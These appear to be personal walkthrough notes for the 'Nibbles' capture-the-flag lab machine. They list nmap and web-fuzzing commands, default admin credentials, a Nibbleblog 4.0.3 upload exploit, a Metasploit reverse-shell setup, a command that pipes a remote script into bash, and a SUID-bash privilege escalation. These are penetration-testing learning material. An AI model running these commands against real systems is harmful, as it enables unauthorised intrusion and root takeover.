- [ ] Nibbles Enumeration
```sh
# initial service scanning
nmap -v -sV --open -oA nibbles_initial_scan 10.129.244.119
# default scripts
nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.244.119
# http enum
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.244.119 
```
![[Pasted image 20250521170904.png]]
- [ ] Nibbles FootPrinting
```sh
# whatweb
whatweb http://10.129.244.119/
# curl 
curl -I http://10.129.244.119/
curl http://10.129.244.119/
# directory fuzzing
gobuster dir -u http://10.129.244.119/ -w wordlist.txt
ffuf -c -u http://10.129.244.119/FUZZ -w wordlist.txt
dirsearch -u http://10.129.244.119/
```
![[Pasted image 20250521171348.png]]
![[Pasted image 20250521172004.png]]
![[Pasted image 20250521172344.png]]
- [ ] Nibbles FootHold
```sh
# user creds
admin:nibbles
# search exploit
nibbleblog 4.0 3 exploit
# foothold
python3 nibbleblog_4.0.3.py -t http://10.129.240.56/nibbleblog/admin.php -u admin -p nibbles -shell
python3 nibbleblog_4.0.3.py -t http://10.129.240.56/nibbleblog/admin.php -u admin -p nibbles -rce 'curl 10.10.15.253/b.sh|bash'
```
![[Pasted image 20250521173228.png]]
![[Pasted image 20250521173704.png]]
Metasploit!!!
```sh
search nibbleblog
use exploit/multi/http/nibbleblog_file_upload
set username admin
set password nibbles
set targeturi nibbleblog
set payload generic/shell_reverse_tcp
exploit
```
- [ ] Nibbles Privilege Escalation
```sh
# linpeas
[CVE-2016-5195] dirtycow
[CVE-2016-5195] dirtycow 2
tcp        0      0 127.0.0.1:3306 mysql
MySQL connection using root/toor ................... Yes
/var/www/html/nibbleblog
# exploitation
unzip personal.zip
echo 'chmod +s /bin/bash' > monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
/bin/bash -p
```
![[Pasted image 20250522182735.png]]
![[Pasted image 20250522182807.png]]

